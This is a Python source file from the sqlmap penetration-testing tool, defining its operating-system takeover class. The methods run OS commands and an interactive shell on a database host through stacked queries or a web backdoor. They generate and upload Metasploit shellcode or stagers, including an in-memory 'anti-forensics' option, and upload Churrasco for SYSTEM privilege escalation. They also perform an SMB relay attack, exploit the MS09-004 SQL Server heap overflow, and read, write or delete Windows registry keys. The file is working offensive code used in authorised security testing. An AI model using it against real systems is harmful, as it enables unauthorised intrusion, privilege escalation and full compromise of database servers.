#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2010 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""

import os
import re

from lib.core.agent import agent
from lib.core.common import decloakToNamedTemporaryFile
from lib.core.common import fileToStr
from lib.core.common import getDirs
from lib.core.common import getDocRoot
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.convert import hexencode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.exception import sqlmapNotVulnerableException
from lib.core.exception import sqlmapUnsupportedDBMSException
from lib.core.shell import autoCompletion
from lib.request.connect import Connect as Request
from lib.takeover.abstraction import Abstraction
from lib.takeover.metasploit import Metasploit
from lib.takeover.registry import Registry
from lib.techniques.outband.stacked import stackedTest

class Takeover(Abstraction, Metasploit, Registry):
    """
    This class defines generic OS takeover functionalities for plugins.
    """

    def __init__(self):
        self.cmdTblName       = "sqlmapoutput"
        self.tblField         = "data"
        self.cmdFromChurrasco = False

        Abstraction.__init__(self)

    def uploadChurrasco(self):
        msg  = "do you want sqlmap to upload Churrasco and call the "
        msg += "Metasploit payload stager as its argument so that it "
        msg += "will be started as SYSTEM? [y/N] "

        output = readInput(msg, default="N")

        if output and output[0] in ( "y", "Y" ):
            tmpFile = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_CONTRIB_PATH, "tokenkidnapping", "Churrasco.exe_"))

            wFile                 = tmpFile.name
            self.churrascoPath    = "%s/tmpc%s.exe" % (conf.tmpPath, randomStr(lowercase=True))
            self.cmdFromChurrasco = True
            
            self.writeFile(wFile, self.churrascoPath, "binary", confirm=False)
            
            tmpFile.close()

            return True
        else:
            return False

    def osCmd(self):
        stackedTest()

        if kb.stackedTest:
            web = False
        elif not kb.stackedTest and kb.dbms == "MySQL":
            infoMsg = "going to use a web backdoor for command execution"
            logger.info(infoMsg)

            web = True
        else:
            errMsg  = "unable to execute operating system commands via "
            errMsg += "the back-end DBMS"
            raise sqlmapNotVulnerableException(errMsg)

        self.initEnv(web=web)

        if not web or (web and self.webBackdoorUrl is not None):
            self.runCmd(conf.osCmd)

        if not conf.osShell and not conf.osPwn and not conf.cleanup:
            self.cleanup()

    def osShell(self):
        stackedTest()

        if kb.stackedTest:
            web = False
        elif not kb.stackedTest and kb.dbms == "MySQL":
            infoMsg = "going to use a web backdoor for command prompt"
            logger.info(infoMsg)

            web = True
        else:
            errMsg  = "unable to prompt for an interactive operating "
            errMsg += "system shell via the back-end DBMS"
            raise sqlmapNotVulnerableException(errMsg)

        self.initEnv(web=web)

        if not web or (web and self.webBackdoorUrl is not None):
            self.shell()

        if not conf.osPwn and not conf.cleanup:
            self.cleanup()

    def osPwn(self):
        goUdf = False

        stackedTest()

        if kb.stackedTest:
            web = False

            self.initEnv(web=web)
            self.getRemoteTempPath()

            if kb.dbms in ( "MySQL", "PostgreSQL" ):
                msg  = "how do you want to execute the Metasploit shellcode "
                msg += "on the back-end database underlying operating system?"
                msg += "\n[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)"
                msg += "\n[2] Stand-alone payload stager (file system way)"

                while True:
                    choice = readInput(msg, default=1)

                    if isinstance(choice, str) and choice.isdigit() and int(choice) in ( 1, 2 ):
                        choice = int(choice)
                        break

                    elif isinstance(choice, int) and choice in ( 1, 2 ):
                        break

                    else:
                        warnMsg = "invalid value, valid values are 1 and 2"
                        logger.warn(warnMsg)

                if choice == 1:
                    goUdf = True

            if goUdf:
                self.createMsfShellcode(exitfunc="thread", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
            else:
                self.createMsfPayloadStager()
                self.uploadMsfPayloadStager()

            if kb.os == "Windows" and conf.privEsc:
                if kb.dbms == "MySQL":
                    debugMsg  = "by default MySQL on Windows runs as SYSTEM "
                    debugMsg += "user, no need to privilege escalate"
                    logger.debug(debugMsg)

                elif kb.dbms == "PostgreSQL":
                    debugMsg  = "by default PostgreSQL on Windows runs as postgres "
                    debugMsg += "user which has no access to LSASS: it is "
                    debugMsg += "unlikely that the privilege escalation "
                    debugMsg += "via 'incognito' extension will be successful"
                    logger.debug(debugMsg)

                elif kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
                    debugMsg  = "often Microsoft SQL Server %s " % kb.dbmsVersion[0]
                    debugMsg += "runs as Network Service which has Windows "
                    debugMsg += "Impersonation Tokens"
                    logger.debug(debugMsg)

                    uploaded = self.uploadChurrasco()

                    if not uploaded:
                        debugMsg  = "beware that the privilege escalation "
                        debugMsg += "might not work via Churrasco if "
                        debugMsg += "MS09-012 patch is installed"
                        logger.debug(debugMsg)

            elif kb.os != "Windows" and conf.privEsc:
                # Unset --priv-esc if the back-end DBMS underlying operating
                # system is not Windows
                conf.privEsc = False

                warnMsg  = "sqlmap does not implement any operating system "
                warnMsg += "user privilege escalation technique when the "
                warnMsg += "back-end DBMS underlying system is not Windows"
                logger.warn(warnMsg)

        elif not kb.stackedTest and kb.dbms == "MySQL":
            infoMsg  = "going to use a web backdoor to execute the "
            infoMsg += "payload stager"
            logger.info(infoMsg)

            web = True

            self.initEnv(web=web)

            if self.webBackdoorUrl:
                if kb.os != "Windows" and conf.privEsc:
                    # Unset --priv-esc if the back-end DBMS underlying operating
                    # system is not Windows
                    conf.privEsc = False

                    warnMsg  = "sqlmap does not implement any operating system "
                    warnMsg += "user privilege escalation technique when the "
                    warnMsg += "back-end DBMS underlying system is not Windows"
                    logger.warn(warnMsg)

                self.getRemoteTempPath()
                self.createMsfPayloadStager()
                self.uploadMsfPayloadStager(web=True)
        else:
            errMsg  = "unable to prompt for an out-of-band session via "
            errMsg += "the back-end DBMS"
            raise sqlmapNotVulnerableException(errMsg)

        if not web or (web and self.webBackdoorUrl is not None):
            self.pwn(goUdf)

        if not conf.cleanup:
            self.cleanup()

    def osSmb(self):
        stackedTest()

        self.checkDbmsOs()

        if kb.os != "Windows":
            errMsg  = "the back-end DBMS underlying operating system is "
            errMsg += "not Windows: it is not possible to perform the SMB "
            errMsg += "relay attack"
            raise sqlmapUnsupportedDBMSException(errMsg)

        if not kb.stackedTest:
            if kb.dbms in ( "PostgreSQL", "Microsoft SQL Server" ):
                errMsg  = "on this back-end DBMS it is only possible to "
                errMsg += "perform the SMB relay attack if stacked "
                errMsg += "queries are supported"
                raise sqlmapUnsupportedDBMSException(errMsg)

            elif kb.dbms == "MySQL":
                debugMsg  = "since stacked queries are not supported, "
                debugMsg += "sqlmap is going to perform the SMB relay "
                debugMsg += "attack via inference blind SQL injection"
                logger.debug(debugMsg)

        printWarn = True
        warnMsg   = "it is unlikely that this attack will be successful "

        if kb.dbms == "MySQL":
            warnMsg += "because by default MySQL on Windows runs as "
            warnMsg += "Local System which is not a real user, it does "
            warnMsg += "not send the NTLM session hash when connecting to "
            warnMsg += "a SMB service"

        elif kb.dbms == "PostgreSQL":
            warnMsg += "because by default PostgreSQL on Windows runs "
            warnMsg += "as postgres user which is a real user of the "
            warnMsg += "system, but not within the Administrators group"

        elif kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
            warnMsg += "because often Microsoft SQL Server %s " % kb.dbmsVersion[0]
            warnMsg += "runs as Network Service which is not a real user, "
            warnMsg += "it does not send the NTLM session hash when "
            warnMsg += "connecting to a SMB service"

        else:
            printWarn = False

        if printWarn:
            logger.warn(warnMsg)

        self.smb()

    def osBof(self):
        stackedTest()

        if not kb.stackedTest:
            return

        if not kb.dbms == "Microsoft SQL Server" or kb.dbmsVersion[0] not in ( "2000", "2005" ):
            errMsg  = "the back-end DBMS must be Microsoft SQL Server "
            errMsg += "2000 or 2005 to be able to exploit the heap-based "
            errMsg += "buffer overflow in the 'sp_replwritetovarbin' "
            errMsg += "stored procedure (MS09-004)"
            raise sqlmapUnsupportedDBMSException(errMsg)

        infoMsg  = "going to exploit the Microsoft SQL Server %s " % kb.dbmsVersion[0]
        infoMsg += "'sp_replwritetovarbin' stored procedure heap-based "
        infoMsg += "buffer overflow (MS09-004)"
        logger.info(infoMsg)

        self.initEnv(mandatory=False, detailed=True)
        self.getRemoteTempPath()
        self.createMsfShellcode(exitfunc="seh", format="raw", extra="-b 27", encode=True)
        self.bof()

    def __regInit(self):
        stackedTest()

        if not kb.stackedTest:
            return

        self.checkDbmsOs()

        if kb.os != "Windows":
            errMsg  = "the back-end DBMS underlying operating system is "
            errMsg += "not Windows"
            raise sqlmapUnsupportedDBMSException(errMsg)

        self.initEnv()
        self.getRemoteTempPath()

    def regRead(self):
        self.__regInit()

        if not conf.regKey:
            default = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
            msg     = "which registry key do you want to read? [%s] " % default
            regKey  = readInput(msg, default=default)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            default = "ProductName"
            msg     = "which registry key value do you want to read? [%s] " % default
            regVal  = readInput(msg, default=default)
        else:
            regVal = conf.regVal

        infoMsg = "reading Windows registry path '%s\%s' " % (regKey, regVal)
        logger.info(infoMsg)

        return self.readRegKey(regKey, regVal, True)

    def regAdd(self):
        self.__regInit()

        errMsg = "missing mandatory option"

        if not conf.regKey:
            msg    = "which registry key do you want to write? "
            regKey = readInput(msg)

            if not regKey:
                raise sqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg    = "which registry key value do you want to write? "
            regVal = readInput(msg)

            if not regVal:
                raise sqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        if not conf.regData:
            msg     = "which registry key value data do you want to write? "
            regData = readInput(msg)

            if not regData:
                raise sqlmapMissingMandatoryOptionException(errMsg)
        else:
            regData = conf.regData

        if not conf.regType:
            default = "REG_SZ"
            msg     = "which registry key value data-type is it? "
            msg    += "[%s] " % default
            regType = readInput(msg, default=default)
        else:
            regType = conf.regType

        infoMsg  = "adding Windows registry path '%s\%s' " % (regKey, regVal)
        infoMsg += "with data '%s'. " % regData
        infoMsg += "This will work only if the user running the database "
        infoMsg += "process has privileges to modify the Windows registry."
        logger.info(infoMsg)

        self.addRegKey(regKey, regVal, regType, regData)

    def regDel(self):
        self.__regInit()

        errMsg = "missing mandatory option"

        if not conf.regKey:
            msg    = "which registry key do you want to delete? "
            regKey = readInput(msg)

            if not regKey:
                raise sqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg    = "which registry key value do you want to delete? "
            regVal = readInput(msg)

            if not regVal:
                raise sqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        message  = "are you sure that you want to delete the Windows "
        message += "registry path '%s\%s? [y/N] " % (regKey, regVal)
        output   = readInput(message, default="N")

        if output and output[0] not in ( "Y", "y" ):
            return

        infoMsg  = "deleting Windows registry path '%s\%s'" % (regKey, regVal)
        infoMsg += "This will work only if the user running the database "
        infoMsg += "process has privileges to modify the Windows registry."
        logger.info(infoMsg)

        self.delRegKey(regKey, regVal)
